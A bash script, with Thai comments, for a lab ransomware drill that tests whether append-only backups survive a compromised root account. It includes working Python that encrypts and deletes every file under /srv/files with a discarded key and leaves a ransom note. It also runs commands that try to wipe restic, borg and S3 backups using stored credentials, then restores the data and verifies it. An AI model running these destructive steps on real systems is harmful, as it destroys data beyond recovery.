#!/bin/bash
# ransomware-drill.sh: ซ้อม ransomware บน prod ด้วย root (Lab 4.2) เข้ารหัส /srv/files แล้วกู้จาก rest-server
# ⚠️ ใช้กับเครื่อง Lab เท่านั้น กุญแจที่ใช้เข้ารหัสไม่ถูกเก็บไว้
set -euo pipefail
command -v python3 >/dev/null
cd /srv/files && find . -type f -print0 | sort -z | xargs -0 sha256sum > /root/files-before.sha256
echo "manifest: $(wc -l < /root/files-before.sha256) files"
/usr/local/sbin/restic-backup.sh 2>&1 | tail -1
echo "== ransomware runs"
python3 - <<'PY'
import os, pathlib
key = os.urandom(32)
n = 0
for p in pathlib.Path("/srv/files").rglob("*"):
    if p.is_file() and p.suffix != ".locked":
        d = p.read_bytes()
        p.with_name(p.name + ".locked").write_bytes(bytes(b ^ key[i % 32] for i, b in enumerate(d)))
        p.unlink(); n += 1
pathlib.Path("/srv/files/README-RANSOM.txt").write_text("จ่ายค่าไถ่เพื่อรับกุญแจ\n")
print(f"encrypted {n} files")
PY
ls /srv/files/hr | head -3
head -c 60 /srv/files/hr/doc-001.txt.locked | od -c | head -2
echo "== attacker tries to destroy backups with prod's credentials"
( source /root/.config/restic/env; timeout 60 restic forget --keep-last 1 2>&1 | grep -m1 -E "403|Forbidden" || true )
( source /root/.config/borg-env; for a in $(borg list --short); do borg delete --force "::$a" >/dev/null 2>&1 || true; done; echo "borg archives seen by prod: $(borg list --short | wc -l)" )
( source /root/.config/restic/s3-env; E="--endpoint-url http://192.168.56.86:8333"; aws $E s3 rm s3://restic-prod --recursive >/dev/null 2>&1 || true; echo "s3 objects seen by prod: $(aws $E s3 ls s3://restic-prod --recursive | wc -l)" )
echo "== recovery from rest-server"
start=$(date +%s)
rm -rf /srv/files
( source /root/.config/restic/env; restic restore latest --no-lock --target / --include /srv/files 2>&1 | tail -1 )
end=$(date +%s)
cd /srv/files && sha256sum --quiet -c /root/files-before.sha256 && echo "checksum: all $(wc -l < /root/files-before.sha256) files match"
ls /srv/files/hr | head -2
echo "restore $((end - start)) s"
